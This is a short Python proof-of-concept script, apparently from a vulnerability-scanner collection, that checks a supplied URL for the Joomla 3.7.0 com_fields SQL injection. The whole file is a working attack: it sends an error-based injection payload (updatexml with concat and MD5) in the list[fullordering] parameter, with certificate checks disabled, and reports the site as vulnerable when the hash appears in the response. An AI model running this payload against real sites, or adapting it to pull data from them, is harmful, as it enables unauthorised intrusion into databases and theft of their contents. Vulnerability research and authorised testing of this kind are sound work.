#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: joomla 3.7.0 core SQL注入
referer: https://www.08sec.com/bobao/15167.html
author: Lucifer
description: joomla！3.7.0新引入的一个组件”com_fields“，这个组件任何人都可以访问，无需登陆验证。由于对请求数据过滤不严导致sql注入.
'''
import sys
import requests
import warnings
def run(url):
        result = ['joomla 3.7.0 core SQL注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,Md5(1234)),0)"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed05" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
